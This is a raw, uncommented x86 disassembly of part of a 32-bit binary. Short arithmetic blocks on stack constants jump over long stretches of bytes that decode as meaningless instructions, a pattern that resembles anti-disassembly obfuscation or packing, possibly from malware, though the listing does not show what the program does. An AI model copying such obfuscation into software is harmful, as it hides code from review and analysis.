  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xbc
  416d7e:	retf   0xb0bd
  416d81:	jp     0x416d77
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    al,dh
  416d8a:	sbb    BYTE PTR [eax-0x586d37cf],ah
  416d90:	cmp    al,0x78
  416d92:	repnz nop
  416d94:	cmp    eax,0x722fe8f0
  416d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d9b:	stos   BYTE PTR es:[edi],al
  416d9c:	inc    esp
  416d9d:	pop    esp
  416d9e:	and    eax,0xc2f0943b
  416da3:	add    al,0x7b
  416da5:	xor    al,0x4b
  416da7:	ret    0xb105
  416daa:	iret   
  416dab:	mov    ch,BYTE PTR [edx+0x3d170abf]
  416db1:	mov    bl,0x77
  416db3:	and    eax,0x45f26c9f
  416db8:	aaa    
  416db9:	sbb    DWORD PTR [eax+esi*2],0x39b1120
  416dc0:	mov    ah,BYTE PTR [ecx-0x56]
  416dc3:	inc    esi
  416dc4:	aas    
  416dc5:	dec    ebp
  416dc6:	stos   DWORD PTR es:[edi],eax
  416dc7:	call   0xa20cc2ff
  416dcc:	retw   
  416dce:	adc    bh,BYTE PTR [edi-0x607270aa]
  416dd4:	rcr    BYTE PTR [ebp+0x38ccf495],1
  416dda:	fdiv   st(3),st
  416ddc:	push   edi
  416ddd:	jns    0x416daa
  416ddf:	push   es
  416de0:	call   0x18d4cbff
  416de5:	push   ebx
  416de6:	inc    ebp
  416de7:	ja     0x416d9c
  416de9:	jbe    0x416da9
  416deb:	imul   ebp,DWORD PTR [edi+0x1bbc97fa],0x5b
  416df2:	and    ebp,DWORD PTR [esi+0x55928e9a]
  416df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416df9:	jecxz  0x416e7a
  416dfb:	loope  0x416d92
  416dfd:	sbb    al,0x5b
  416dff:	jmp    0x416df6
  416e01:	pop    ds
  416e02:	xor    DWORD PTR [edx-0x161e5618],ebp
  416e08:	add    eax,0xbe80fb3
  416e0d:	mov    ebp,0x92ff685a
  416e12:	adc    esp,edi
  416e14:	pop    ebx
  416e15:	sub    eax,DWORD PTR [esi+0x2cdc15aa]
  416e1b:	jg     0x416dfd
  416e1d:	repnz sbb esi,0x37f949fc
  416e24:	loop   0x416de0
  416e26:	inc    eax
  416e27:	js     0x416e7e
  416e29:	leave  
  416e2a:	stos   BYTE PTR es:[edi],al
  416e2b:	xor    eax,0x27d730e6
  416e30:	fbstp  TBYTE PTR [ebx-0x7150041a]
  416e36:	and    eax,DWORD PTR [edx]
  416e38:	call   0xb490b13b
  416e3d:	inc    ecx
  416e3e:	mov    bl,0x47
  416e40:	scas   eax,DWORD PTR es:[edi]
  416e41:	mov    ecx,0x6c13ffda
  416e46:	out    0x4d,al
  416e48:	dec    ecx
  416e49:	xchg   edx,eax
  416e4a:	fisubr WORD PTR [ecx+0x35]
  416e4d:	push   eax
  416e4e:	xchg   edi,eax
  416e4f:	(bad)  
  416e50:	pusha  
  416e51:	dec    ebx
  416e52:	xchg   ebp,eax
  416e53:	clc    
  416e54:	fistp  WORD PTR [esi]
  416e56:	and    DWORD PTR [eax-0x1f],ebp
  416e59:	or     eax,0x27bd2d5c
  416e5e:	mov    ecx,DWORD PTR [edx]
  416e60:	in     eax,dx
  416e61:	pop    edx
  416e62:	add    eax,0x1bab9a67
  416e67:	ds aas 
  416e69:	test   eax,0x83fd69b0
  416e6e:	lock sbb cl,al
  416e71:	sub    ebx,DWORD PTR [eax]
  416e73:	gs inc ebx
  416e75:	xchg   dh,cl
  416e77:	and    eax,0x716424be
  416e7c:	sub    BYTE PTR es:[edi+0x7493f3d0],bh
  416e83:	(bad)  
  416e85:	mov    bl,0xd
  416e87:	imul   ebp,DWORD PTR [eax+edi*2+0x4d85d640],0x2fc03c38
  416e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e94:	cli    
  416e95:	inc    edi
  416e96:	jge    0x416e1e
  416e98:	or     DWORD PTR [ecx-0x7d221b6d],0x4c1f95d4
  416ea2:	xlat   BYTE PTR ds:[ebx]
  416ea3:	lea    edi,[ebx]
  416ea5:	test   BYTE PTR [ebp+0x6ef59db6],cl
  416eab:	call   0xae961ed0
  416eb0:	sahf   
  416eb1:	ret    
  416eb2:	push   edx
  416eb3:	and    DWORD PTR [esp+esi*1-0x5f],ebp
  416eb7:	ins    BYTE PTR es:[edi],dx
  416eb8:	pop    ebp
  416eb9:	cwde   
  416eba:	mov    ds:0xbd73426e,eax
  416ebf:	leave  
  416ec0:	jbe    0x416e5d
  416ec2:	neg    BYTE PTR [eax]
  416ec4:	mov    al,0x19
  416ec6:	iret   
  416ec7:	xlat   BYTE PTR ds:[ebx]
  416ec8:	xchg   ebx,eax
  416ec9:	mov    ebp,esi
  416ecb:	cli    
  416ecc:	xchg   esi,eax
  416ecd:	mov    cl,dh
  416ecf:	jge    0x416e8c
  416ed1:	dec    edi
  416ed2:	dec    eax
  416ed3:	mov    al,0x19
  416ed5:	cmc    
  416ed6:	mov    bl,0x31
  416ed8:	loope  0x416f17
  416eda:	inc    edx
  416edb:	push   0x1629863e
  416ee0:	sub    dl,dh
  416ee2:	adc    ah,bl
  416ee4:	in     eax,0x46
  416ee6:	pop    ecx
  416ee7:	sub    al,0xc8
  416ee9:	bound  edx,QWORD PTR [esi-0x5ccddd75]
  416eef:	dec    ecx
  416ef0:	std    
  416ef1:	adc    edi,ebp
  416ef3:	mov    ch,0x7a
  416ef5:	mov    al,0xea
  416ef7:	mov    ebx,esp
  416ef9:	fiadd  DWORD PTR [ebp+0x5d]
  416efc:	scas   eax,DWORD PTR es:[edi]
  416efd:	stos   BYTE PTR es:[edi],al
  416efe:	test   BYTE PTR [ebx],ah
  416f00:	in     eax,dx
  416f01:	leave  
  416f02:	or     bh,BYTE PTR [eax+0xf4bf61]
  416f08:	stc    
  416f09:	mov    cl,al
  416f0b:	mov    esi,0x43742d1
  416f10:	or     eax,0x346b704e
  416f15:	fisttp QWORD PTR [eax]
  416f17:	push   esp
  416f18:	fsub   QWORD PTR [edi-0x729f3b36]
  416f1e:	push   ecx
  416f1f:	sbb    ebx,DWORD PTR [ecx-0x25352ae2]
  416f25:	mov    ds:0xca14b49f,al
  416f2a:	sbb    al,0x65
  416f2d:	test   DWORD PTR [ecx+eiz*8-0x4f],eax
  416f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f32:	and    BYTE PTR [edi+esi*1+0x3e],bl
  416f36:	sbb    eax,DWORD PTR [ecx]
  416f38:	inc    edi
  416f39:	lock imul ebp,DWORD PTR ds:0x8ccbd35b,0xc3804f59
  416f44:	(bad)  
  416f46:	push   ebp
  416f47:	mov    edi,0xaefe42fd
  416f4c:	xchg   ebp,eax
  416f4d:	shl    BYTE PTR [ecx+0x28b6bf83],cl
  416f53:	gs sbb eax,0x332218c6
  416f59:	call   0x38a936e
  416f5e:	sar    ch,1
  416f60:	xchg   ebx,eax
  416f61:	add    DWORD PTR [eax],esi
  416f63:	mov    al,ds:0x8b10c03e
  416f68:	push   esp
  416f69:	jmp    0x416fdf
  416f6b:	jbe    0x416fc8
  416f6d:	(bad)  
  416f6e:	icebp  
  416f6f:	int3   
  416f70:	js     0x416f9a
  416f72:	cmp    eax,0xdbee31ef
  416f77:	cmc    
  416f78:	popf   
  416f79:	shl    BYTE PTR [ecx+0x4f9c7b8f],0xc1
  416f80:	jnp    0x416f7a
  416f82:	xchg   DWORD PTR [ecx+0x7e],ecx
  416f85:	lahf   
  416f86:	out    dx,eax
  416f87:	(bad)  
  416f88:	imul   ebp,DWORD PTR [edi],0xfed7d719
  416f8e:	inc    BYTE PTR [ebp-0x7f]
  416f91:	jo     0x416f45
  416f93:	shld   DWORD PTR [ebx+0x3aa66393],edi,cl
  416f9a:	sub    BYTE PTR [ebx+0x3a],dh
  416f9d:	jl     0x416f97
  416f9f:	mov    al,0x53
  416fa1:	push   edx
  416fa2:	pop    esp
  416fa3:	push   ecx
  416fa4:	push   edx
  416fa5:	bound  eax,QWORD PTR [edi-0x4a4a4182]
  416fab:	ror    DWORD PTR [edi+0x4617187c],0x6f
  416fb2:	push   ebx
  416fb3:	(bad)  
  416fb4:	shl    DWORD PTR [ebp-0x7b62a2ea],0x92
  416fbb:	ror    BYTE PTR [ecx+0x74072759],0x29
  416fc2:	shr    DWORD PTR [esi],0xad
  416fc5:	sbb    ch,BYTE PTR [ecx-0x77]
  416fc8:	jns    0x416fd2
  416fca:	inc    eax
  416fcb:	or     al,0x7d
  416fcd:	push   edi
  416fce:	xor    al,0x6d
  416fd0:	in     al,0x48
  416fd2:	cdq    
  416fd3:	xchg   ebx,eax
  416fd4:	dec    edi
  416fd5:	jbe    0x41703d
  416fd7:	or     DWORD PTR fs:[edx],esp
  416fda:	inc    ebp
  416fdb:	mov    ah,0x60
  416fdd:	pop    ecx
  416fde:	es sti 
  416fe0:	fld    QWORD PTR [eax]
  416fe2:	inc    esi
  416fe3:	inc    esp
  416fe4:	pop    ebp
  416fe5:	retf   
  416fe6:	pop    ecx
  416fe7:	jb     0x417061
  416fe9:	fsub   QWORD PTR [esi+0x603461a3]
  416fef:	lods   eax,DWORD PTR ds:[esi]
  416ff0:	mov    ebx,0xd0270dd3
  416ff5:	or     eax,0xc52304e9
  416ffa:	cmc    
  416ffb:	jnp    0x416fc8
  416ffd:	cmp    al,0xf7
  416fff:	cmc    
  417000:	mov    edi,0x32a38e46
  417005:	shl    edi,cl
  417007:	lea    edi,[eax-0x38]
  41700a:	mov    esp,0xd1d5f189
  41700f:	sbb    eax,0x2ef88601
  417014:	pop    esi
  417015:	lods   al,BYTE PTR ds:[esi]
  417016:	dec    ebx
  417017:	enter  0xb431,0xea
  41701b:	repz jmp 0xf35c:0xfadcbf7
  417023:	jae    0x41706d
  417025:	push   es
  417026:	test   BYTE PTR [ebp+edi*1-0x7e],cl
  41702a:	pop    esi
  41702b:	xchg   edx,eax
  41702c:	sahf   
  41702d:	inc    ebp
  41702e:	jae    0x41705d
  417030:	iret   
  417031:	pop    ebp
  417032:	and    BYTE PTR [ecx],cl
  417034:	sahf   
  417035:	and    eax,0x79caff63
  41703a:	arpl   di,si
  41703c:	(bad)  
  41703d:	out    dx,eax
  41703e:	mov    eax,0x78c6b730
  417043:	mov    ebp,0x7a13bf06
  417048:	jmp    0xc14c:0x880107f3
  41704f:	mov    WORD PTR [eax],es
  417051:	ins    BYTE PTR es:[edi],dx
  417052:	xchg   esi,eax
  417053:	xor    DWORD PTR [eax],edi
  417055:	inc    BYTE PTR [ecx+0x79b2bf37]
  41705b:	mov    al,BYTE PTR [ecx+eax*8+0x6f]
  41705f:	sbb    DWORD PTR [esi-0x5d],esi
  417062:	mov    al,0x45
  417064:	cmp    ecx,eax
  417066:	into   
  417067:	sub    eax,0xb0103362
  41706c:	lods   al,BYTE PTR ds:[esi]
  41706d:	xor    DWORD PTR [eax],0x49a15723
  417073:	pop    es
  417074:	push   0x49
  417076:	jp     0x417078
  417078:	xchg   ebp,eax
  417079:	jmp    0x9376a50a
  41707e:	mov    bh,0x7e
  417080:	jns    0x4170ad
  417082:	mov    dh,0x9e
  417084:	sub    BYTE PTR [edx-0x287f87bc],bh
  41708a:	pop    es
  41708b:	mov    DWORD PTR [edi-0x4a],ebx
  41708e:	shl    DWORD PTR [edi+eiz*1-0x42],1
  417092:	arpl   bp,sp
  417094:	add    eax,0xd7430e07
  417099:	pop    edi
  41709a:	loop   0x41704d
  41709c:	sti    
  41709d:	(bad)  
  41709e:	sar    BYTE PTR [ebx+ecx*4-0x80],cl
  4170a2:	jmp    0xcde6f15
  4170a7:	int    0xc5
  4170a9:	mov    eax,DWORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x6af8b7cb
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [edi+0x68288d65],dh
  4171a3:	pop    ebp
  4171a4:	and    esp,edx
  4171a6:	cmp    edi,DWORD PTR [edi]
  4171a8:	push   es
  4171a9:	dec    esi
  4171aa:	cdq    
  4171ab:	dec    edx
  4171ac:	iret   
  4171ad:	scas   al,BYTE PTR es:[edi]
  4171ae:	inc    ecx
  4171af:	mov    esi,0x9bddaf18
  4171b4:	mov    edx,0x5bdf5472
  4171b9:	cmp    eax,0x1fabea06
  4171be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171bf:	add    bl,BYTE PTR [ebx-0x22]
  4171c2:	in     al,dx
  4171c3:	adc    esp,DWORD PTR [eax+ebx*4+0x72]
  4171c7:	js     0x4171d8
  4171c9:	push   cs
  4171ca:	add    dl,BYTE PTR [ebx+edi*1+0x253ecdbe]
  4171d1:	fwait
  4171d2:	add    ebp,ebx
  4171d4:	rol    BYTE PTR [edi-0x6d1836ff],1
  4171da:	pop    ebp
  4171db:	cmp    al,0xe5
  4171dd:	jne    0x417166
  4171df:	mov    al,0xd3
  4171e1:	mov    dh,0xe0
  4171e3:	jb     0x417199
  4171e5:	lock jle 0x417260
  4171e8:	pop    esi
  4171e9:	jle    0x41725d
  4171eb:	xor    DWORD PTR [edx],esi
  4171ed:	add    al,0x1e
  4171ef:	mov    ebp,0x1d45afa6
  4171f4:	repz push es
  4171f6:	mov    ch,0x6a
  4171f8:	adc    ecx,DWORD PTR [eax+0x5c88d84f]
  4171fe:	lods   eax,DWORD PTR ds:[esi]
  4171ff:	mov    eax,DWORD PTR [eax]
  417201:	jo     0x41719f
  417203:	adc    eax,0xf92bfa11
  417208:	adc    BYTE PTR [eax+esi*8],0x20
  41720c:	jbe    0x669191bb
  417212:	pusha  
  417213:	inc    esi
  417214:	int    0xf0
  417216:	loope  0x4171d9
  417218:	inc    esp
  417219:	jge    0x4171aa
  41721b:	inc    ebp
  41721c:	cmp    BYTE PTR ds:0xe2f01250,0x9d
  417223:	add    esp,DWORD PTR [edx-0x6bd9c095]
  417229:	sbb    esi,DWORD PTR [ebx-0x49]
  41722c:	mov    al,ds:0xbc78131b
  417231:	push   ss
  417232:	hlt    
  417233:	lods   al,BYTE PTR ds:[esi]
  417234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417235:	dec    esp
  417236:	inc    ebp
  417237:	sub    al,0x5a
  417239:	xor    DWORD PTR [ebx],ebx
  41723b:	pop    ds
  41723c:	or     dl,0xe3
  41723f:	aam    0x24
  417241:	cwde   
  417242:	push   0xe
  417244:	inc    esi
  417245:	fimul  DWORD PTR [edi]
  417247:	gs mov bh,0x72
  41724a:	mov    ds:0xa8a86db7,al
  41724f:	mov    esp,0xa2b69178
  417254:	sbb    DWORD PTR [ebp-0x5f],0x1b8f8b36
  41725b:	mov    edx,DWORD PTR [ebp-0x2c]
  41725e:	and    ah,BYTE PTR [ecx+0x43]
  417261:	push   ebp
  417262:	int3   
  417263:	dec    eax
  417264:	(bad)  
  417265:	inc    DWORD PTR [edx-0x137c9799]
  41726b:	cmp    DWORD PTR [ebp+0x693b4445],edi
  417271:	stc    
  417272:	add    edx,eax
  417274:	shr    BYTE PTR [edx-0x161b77f0],cl
  41727a:	and    eax,DWORD PTR [edi+edx*2+0x76f98657]
  417281:	je     0x417265
  417283:	xor    BYTE PTR [esi+0x53],al
  417286:	push   0xffffffdf
  417288:	pop    ecx
  417289:	xchg   BYTE PTR [ecx-0x2c],cl
  41728c:	mov    dh,0xb9
  41728e:	cmp    ecx,DWORD PTR [ebx-0x38ffaa8c]
  417294:	scas   al,BYTE PTR es:[edi]
  417295:	mov    eax,0x9d80d6ee
  41729a:	sbb    al,0x1b
  41729c:	jne    0x417251
  41729e:	xchg   esi,eax
  41729f:	stos   BYTE PTR es:[edi],al
  4172a0:	cli    
  4172a1:	sbb    cl,0xb4
  4172a4:	sbb    BYTE PTR gs:[ebx],cl
  4172a7:	pop    edx
  4172a8:	std    
  4172a9:	fistp  QWORD PTR [ecx+0x39]
  4172ac:	icebp  
  4172ad:	ds in  al,0x12
  4172b0:	setae  ah
  4172b3:	icebp  
  4172b4:	mov    esp,0xe91161dd
  4172b9:	bound  edx,QWORD PTR [ecx+0x4ec34296]
  4172bf:	jmp    0x710:0x9d9add59
  4172c6:	sub    ebp,DWORD PTR [ebx]
  4172c8:	mov    ah,0xcd
  4172ca:	or     BYTE PTR [eax-0x72b8be57],cl
  4172d0:	mov    BYTE PTR [ebx+0x22],bh
  4172d3:	inc    eax
  4172d4:	fs pop ss
  4172d6:	hlt    
  4172d7:	or     al,0x47
  4172d9:	repnz push eax
  4172db:	and    BYTE PTR [ebx],ah
  4172dd:	addr16 jp 0x4172da
  4172e0:	rol    BYTE PTR [ecx*8-0x32151cb7],1
  4172e7:	jle    0x417367
  4172e9:	std    
  4172ea:	jmp    DWORD PTR [bp+di-0x13]
  4172ee:	inc    ebp
  4172ef:	stos   BYTE PTR es:[edi],al
  4172f0:	rcl    BYTE PTR [esi-0x507f6803],cl
  4172f6:	push   ecx
  4172f7:	jp     0x4172a7
  4172f9:	fs push ss
  4172fb:	ret    0xe018
  4172fe:	pushf  
  4172ff:	adc    eax,0xadb9e01e
  417304:	jg     0x417287
  417306:	jl     0x4172c3
  417308:	gs shl DWORD PTR ss:[edx+0x44b3762b],1
  417310:	or     ch,0x43
  417313:	scas   eax,DWORD PTR es:[edi]
  417314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417315:	out    0x59,eax
  417317:	popa   
  417318:	repnz outs dx,DWORD PTR ds:[esi]
  41731a:	sub    eax,0x6ad42ba3
  41731f:	pushf  
  417320:	xchg   edi,eax
  417321:	bound  eax,QWORD PTR [esi-0x4ed59a8b]
  417327:	js     0x41731a
  417329:	arpl   WORD PTR [edx+0x1611bfe8],di
  41732f:	mov    DWORD PTR [ecx+0x66b7a56e],ecx
  417335:	imul   ebx,DWORD PTR [esi+ebp*2+0x6da91cde],0x3d
  41733d:	jecxz  0x417347
  41733f:	es cli 
  417341:	out    0xf0,al
  417343:	pop    ss
  417344:	inc    ebp
  417345:	(bad)  
  417346:	out    dx,eax
  417347:	adc    BYTE PTR [edi],bl
  417349:	and    eax,0x16304aab
  41734e:	push   ecx
  41734f:	fs das 
  417351:	inc    ebx
  417352:	jp     0x417322
  417354:	jmp    0x5c4c:0x7e390f3a
  41735b:	test   BYTE PTR [eax-0x2b],al
  41735e:	pop    esi
  41735f:	or     BYTE PTR [ebp+0x55043d31],dh
  417365:	xchg   DWORD PTR [eax-0x71],edx
  417368:	pop    ebx
  417369:	out    0x21,eax
  41736b:	lds    edx,FWORD PTR [ebp-0x695b7086]
  417371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417372:	lea    ebx,[ebp-0x7f0baa84]
  417378:	aad    0xf8
  41737a:	das    
  41737b:	and    ebx,DWORD PTR [eax+0x2fdd6b]
  417381:	mov    ah,0x81
  417383:	jmp    0x5cde:0x3d6cbe20
  41738a:	shr    ch,cl
  41738c:	div    BYTE PTR ds:0xa0292abe
  417392:	xchg   ebp,eax
  417393:	repnz sbb edx,edi
  417396:	mov    cs,WORD PTR ds:0xae7a9c0f
  41739c:	push   0xf65a3dd4
  4173a1:	add    eax,0x40a2f61f
  4173a6:	push   edi
  4173a7:	pop    eax
  4173a8:	fnstcw WORD PTR ds:0x998c432c
  4173ae:	das    
  4173af:	lock jl 0x417350
  4173b2:	cmp    eax,DWORD PTR [edx-0x13]
  4173b5:	jmp    0xf9ce:0xc008f8f1
  4173bc:	xchg   BYTE PTR [ebp+0x175d1585],dl
  4173c2:	jmp    DWORD PTR [esi-0x6665e871]
  4173c8:	push   ecx
  4173c9:	pop    eax
  4173ca:	pop    esi
  4173cb:	sub    eax,0x5345f17d
  4173d0:	sbb    ecx,ecx
  4173d2:	mov    ah,0xfc
  4173d4:	fdiv   QWORD PTR [ebp+0x1166169a]
  4173da:	adc    dl,BYTE PTR [esp+eax*4]
  4173dd:	mov    al,ds:0x3fd43c50
  4173e2:	jecxz  0x417452
  4173e4:	sbb    al,0x69
  4173e6:	pop    ebp
  4173e7:	je     0x4173a9
  4173e9:	test   bh,ch
  4173eb:	push   es
  4173ec:	inc    edx
  4173ed:	dec    ecx
  4173ee:	inc    esp
  4173ef:	jo     0x4173ce
  4173f1:	sub    eax,0x75d9037f
  4173f6:	inc    eax
  4173f7:	push   ecx
  4173f8:	shr    BYTE PTR [edi],0x88
  4173fb:	add    ecx,DWORD PTR [ebx]
  4173fd:	jmp    0x417419
  4173ff:	xchg   edi,eax
  417400:	mov    edi,DWORD PTR [ecx+0x59]
  417403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417404:	xchg   edi,eax
  417405:	mov    ah,0xec
  417407:	pusha  
  417408:	xchg   DWORD PTR [ebx],esi
  41740a:	or     edi,DWORD PTR [ebx+0x4bf5d3b3]
  417410:	push   0xd3531b75
  417415:	sbb    cl,0xc9
  417418:	fcmovnu st,st(4)
  41741a:	jecxz  0x4173c6
  41741c:	mov    fs,WORD PTR [edx+0x27]
  41741f:	ret    
  417420:	ins    BYTE PTR es:[edi],dx
  417421:	jle    0x4173ac
  417423:	pop    ebx
  417424:	std    
  417425:	and    al,0x85
  417427:	dec    edi
  417428:	retf   
  417429:	fldcw  WORD PTR [ebx-0x68]
  41742c:	je     0x4173e4
  41742e:	gs test al,0xe7
  417431:	invd   
  417433:	pop    ss
  417434:	xor    al,0x84
  417436:	lock popf 
  417438:	out    0x30,al
  41743a:	add    bh,al
  41743c:	fwait
  41743d:	mov    ecx,0xf9579620
  417442:	push   0xffffff93
  417444:	cdq    
  417445:	add    al,0x72
  417447:	ja     0x41741b
  417449:	imul   ebp,DWORD PTR [edx*1+0x6939bcc0],0xc469db4
  417454:	xor    cl,BYTE PTR [ecx]
  417456:	add    BYTE PTR [ebx+0x39],bh
  417459:	loop   0x4174c4
  41745b:	xchg   edx,eax
  41745c:	jl     0x417470
  41745e:	push   ecx
  41745f:	pop    ecx
  417460:	retf   0x3ebd
  417463:	inc    ebx
  417464:	(bad)  
  417465:	out    0xd7,al
  417467:	inc    ebp
  417468:	push   ecx
  417469:	cwde   
  41746a:	(bad)  
  41746b:	cdq    
  41746c:	push   ss
  41746d:	jae    0x4174c0
  41746f:	add    al,0xb3
  417471:	loopne 0x417473
  417473:	pushf  
  417474:	push   eax
  417475:	dec    esi
  417476:	cmc    
  417477:	je     0x41748b
  417479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41747a:	xor    edi,DWORD PTR [ebx]
  41747c:	jnp    0x417493
  41747e:	pushf  
  41747f:	ds (bad) 
  417481:	aam    0xdd
  417483:	(bad)  
  417485:	call   0x29058e8b
  41748a:	pop    edi
  41748b:	or     BYTE PTR [ecx+ebp*4+0x37fd73c0],0x32
  417493:	fwait
  417494:	stos   DWORD PTR es:[edi],eax
  417495:	mov    ebx,0xab34ea0
  41749a:	push   es
  41749b:	repnz xor BYTE PTR [ebx-0x6a8dcf4a],0xce
  4174a3:	les    esp,FWORD PTR [edx]
  4174a5:	lds    esi,FWORD PTR [ecx]
  4174a7:	rcr    DWORD PTR gs:[edi+0x1ff9bf7],1
  4174ae:	in     eax,0x83
  4174b0:	mov    al,0x26
  4174b2:	mov    bl,0xaa
  4174b4:	xchg   edx,eax
  4174b5:	fisubr WORD PTR [ebp-0xb]
  4174b8:	imul   ecx,DWORD PTR [edi+0x264f96cd],0x2bc1335a
  4174c2:	sar    BYTE PTR [ebx],1
  4174c4:	cli    
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422424
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428ec0
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422410
  417502:	call   DWORD PTR ds:0x428ee4
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428ecc
  41750f:	mov    ecx,DWORD PTR ds:0x4227d8
  417515:	sub    DWORD PTR ds:0x42835f,0x4283db
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [eax+eiz*4+0xa7cb359]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x1ea0e7e8],bh
  41753e:	and    al,0x8b
  417541:	push   esp
  417542:	jo     0x417559
  417544:	xchg   ebp,eax
  417545:	outs   dx,WORD PTR ds:[esi]
  417547:	xchg   ecx,eax
  417548:	std    
  417549:	mov    ds:0xa3d10cb0,al
  41754e:	in     al,0x84
  417550:	pusha  
  417551:	rcl    DWORD PTR [edi],0x1
  417554:	jge    0x417507
  417556:	fisttp DWORD PTR [ebp+0x78]
  417559:	sub    al,0xff
